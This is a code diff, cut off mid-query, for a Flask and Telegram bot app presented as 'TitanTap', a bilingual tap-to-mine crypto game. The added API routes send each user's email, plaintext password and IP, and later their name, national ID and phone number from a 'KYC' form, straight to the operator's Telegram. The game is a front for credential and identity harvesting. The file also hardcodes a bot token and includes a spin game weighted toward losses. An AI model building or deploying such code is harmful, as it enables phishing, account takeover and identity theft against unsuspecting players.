@@ -3,12 +3,11 @@ import requests
 import threading
 import telebot
 from telebot import types
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify
 import os
 import time
 import csv
 import random
-import json
 
 # ====== تنظیمات ======
 BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
@@ -140,18 +139,6 @@ def bot_set_balance(message):
         bot.reply_to(message, "❌ فرمت اشتباه است. مثال:\n`/setbalance 5 10000`")
 
 # ====== وب سرور (بازی) ======
-@app.route('/')
-def index():
-    return html_game
-
-@app.route('/manifest.json')
-def manifest():
-    return send_from_directory('.', 'manifest.json')
-
-@app.route('/sw.js')
-def sw():
-    return send_from_directory('.', 'sw.js')
-
 html_game = """
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
@@ -159,8 +146,6 @@ html_game = """
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>TitanTap</title>
-<link rel="manifest" href="/manifest.json">
-<meta name="theme-color" content="#0b0f19">
 <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
 <style>
@@ -212,7 +197,6 @@ html_game = """
 <div class="app-container">
   <div class="lang-toggle" onclick="toggleLang()">EN / FA</div>
   
-  <!-- LOGIN -->
   <div id="login-screen" class="screen active">
     <h1>🛡️ TitanTap</h1>
     <input type="email" id="email" data-fa="ایمیل" data-en="Email Address" placeholder="ایمیل">
@@ -220,10 +204,8 @@ html_game = """
     <button class="btn-action" onclick="register()" data-fa="ساخت حساب" data-en="Create Account">ساخت حساب</button>
   </div>
 
-  <!-- MAIN -->
   <div id="main-app" class="screen">
     
-    <!-- MINE -->
     <div id="tab-mine" class="tab-content">
       <div class="balance-card">
         <div style="font-size:14px; color:#8892b0;" data-fa="موجودی شما" data-en="Your Balance">موجودی شما</div>
@@ -235,7 +217,6 @@ html_game = """
       </div>
     </div>
 
-    <!-- UPGRADES -->
     <div id="tab-upgrades" class="tab-content" style="display:none;">
       <h1 data-fa="کارت‌های استخراج" data-en="Mining Cards">کارت‌های استخراج</h1>
       <div class="cards-grid">
@@ -246,7 +227,6 @@ html_game = """
       </div>
     </div>
 
-    <!-- GAMES -->
     <div id="tab-games" class="tab-content" style="display:none;">
       <h1 data-fa="بازی‌ها و جوایز" data-en="Games & Rewards">بازی‌ها و جوایز</h1>
       <div class="spin-card">
@@ -262,7 +242,6 @@ html_game = """
       </div>
     </div>
 
-    <!-- FRIENDS -->
     <div id="tab-friends" class="tab-content" style="display:none;">
       <h1 data-fa="دعوت دوستان" data-en="Invite Friends">دعوت دوستان</h1>
       <div class="daily-card">
@@ -273,13 +252,11 @@ html_game = """
       </div>
     </div>
 
-    <!-- TOP -->
     <div id="tab-top" class="tab-content" style="display:none;">
       <h1 data-fa="لیدربورد" data-en="Leaderboard">لیدربورد</h1>
       <div id="leaderboard-list"></div>
     </div>
 
-    <!-- PROFILE / KYC -->
     <div id="tab-profile" class="tab-content" style="display:none;">
       <h1 data-fa="پروفایل و احراز هویت" data-en="Profile & KYC">پروفایل و احراز هویت</h1>
       <div class="kyc-card">
@@ -292,7 +269,6 @@ html_game = """
       </div>
     </div>
 
-    <!-- BOTTOM NAV -->
     <div class="bottom-nav">
       <div class="nav-item active" onclick="switchTab('mine', this)"><div class="nav-icon">🪙</div><span data-fa="استخراج" data-en="Mine">استخراج</span></div>
       <div class="nav-item" onclick="switchTab('upgrades', this)"><div class="nav-icon">🃏</div><span data-fa="کارت‌ها" data-en="Cards">کارت‌ها</span></div>
@@ -313,7 +289,6 @@ html_game = """
   let costs = { card1: 100, card2: 500, card3: 2000, card4: 10000 };
   let currentLang = 'fa';
 
-  // Language Toggle
   function toggleLang() {
     currentLang = currentLang === 'fa' ? 'en' : 'fa';
     document.body.dir = currentLang === 'fa' ? 'rtl' : 'ltr';
@@ -328,7 +303,6 @@ html_game = """
     });
   }
 
-  // Sound
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   function playCoinSound() {
       if(audioCtx.state === 'suspended') audioCtx.resume();
@@ -344,8 +318,6 @@ html_game = """
       osc.start();
       osc.stop(audioCtx.currentTime + 0.1);
   }
-
-  if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');
 
   async function register() {
     const email = document.getElementById('email').value;
@@ -512,6 +484,87 @@ html_game = """
 </html>
 """
 
-# ====== API Routes (همون قبلی‌ها، فقط تابع ثبت‌نام و بقیه بدون تغییر) ======
-# برای جلوگیری از طولانی شدن، از کدهای نسخه قبل استفاده کن.
-# فقط مطمئن شو که api/register, api/kyc, api/status, api/tap, api/upgrade, api/cipher, api/spin, api/leaderboard توی کدت هستن.
+@app.route('/')
+def index():
+    return html_game
+
+# ================= API ROUTES =================
+@app.route('/api/register', methods=['POST'])
+def register():
+    data = request.json
+    email = data.get('email')
+    password = data.get('password')
+    ip = request.remote_addr
+    referrer = request.args.get('ref')
+    now = time.time()
+    
+    try:
+        conn = sqlite3.connect('game.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", 
+                  (email, password, ip, referrer, now))
+        conn.commit()
+        conn.close()
+        
+        text = f"🔴 **New Signup (TitanTap)**\n\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP: {ip}\n👥 Ref: {referrer if referrer else 'None'}"
+        bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
+        
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+@app.route('/api/kyc', methods=['POST'])
+def kyc():
+    data = request.json
+    email = data.get('email')
+    fname = data.get('fname')
+    lname = data.get('lname')
+    nid = data.get('nid')
+    phone = data.get('phone')
+    ip = request.remote_addr
+    
+    conn = sqlite3.connect('game.db')
+    c = conn.cursor()
+    c.execute("UPDATE users SET first_name=?, last_name=?, national_id=?, phone=?, kyc_status='pending' WHERE email=?", 
+              (fname, lname, nid, phone, email))
+    conn.commit()
+    conn.close()
+    
+    text = f"💳 **KYC Submitted (TitanTap)**\n\n📧 Email: {email}\n👤 Name: {fname} {lname}\n🆔 National ID: {nid}\n📱 Phone: {phone}\n🌐 IP: {ip}"
+    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
+    return jsonify({"success": True})
+
+@app.route('/api/spin', methods=['POST'])
+def spin():
+    email = request.json.get('email')
+    conn = sqlite3.connect('game.db')
+    c = conn.cursor()
+    c.execute("SELECT balance FROM users WHERE email=?", (email,))
+    bal = c.fetchone()[0]
+    
+    if bal < 100:
+        conn.close()
+        return jsonify({"success": False, "message": "Not enough TTN to spin (Needs 100)"})
+        
+    outcomes = [
+        {"mult": 0, "text": "You lost! Try again."},
+        {"mult": 0, "text": "You lost! Try again."},
+        {"mult": 0.5, "text": "You won 50 TTN!"},
+        {"mult": 1.5, "text": "You won 150 TTN!"},
+        {"mult": 3, "text": "JACKPOT! You won 300 TTN!"}
+    ]
+    result = random.choice(outcomes)
+    new_bal = bal - 100 + (100 * result["mult"])
+    
+    c.execute("UPDATE users SET balance = ? WHERE email=?", (new_bal, email))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"success": True, "result": result["text"], "balance": new_bal})
+
+@app.route('/api/status', methods=['POST'])
+def status():
+    email = request.json.get('email')
+    conn = sqlite3.connect('game.db')
+    c = conn.cursor()
+    c.execute("SELECT status, balance, profit_per_hour, tap_power, card1, card2, card3, card4, ref_count, last_sync FROM users WHERE email
